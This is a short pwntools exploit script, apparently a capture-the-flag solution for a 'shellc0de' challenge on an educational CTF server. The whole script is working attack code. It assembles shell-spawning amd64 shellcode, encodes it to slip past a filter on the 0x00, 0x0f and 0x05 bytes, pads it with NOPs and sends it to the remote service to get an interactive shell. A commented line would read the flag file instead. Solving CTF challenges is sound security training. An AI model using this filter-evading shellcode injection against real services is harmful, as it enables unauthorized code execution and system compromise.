from pwn import *
p = process("./shellc0de")
p = remote("edu-ctf.csie.org", 10150)
context.log_level = "DEBUG"
context.arch = 'amd64'
#shellcode = asm(shellcraft.cat('/home/shellc0de/flag'))
shellcode = asm(shellcraft.sh())
avoid = '\x00\x0f\x05'
enc_sc = pwnlib.encoders.encoder.encode(shellcode,avoid)
assert not any(c in enc_sc for c in avoid)
#p.recv_until("<")
p.sendlineafter("\n",enc_sc.ljust(0xff,"\x90"))
#p.recvline()
p.interactive()
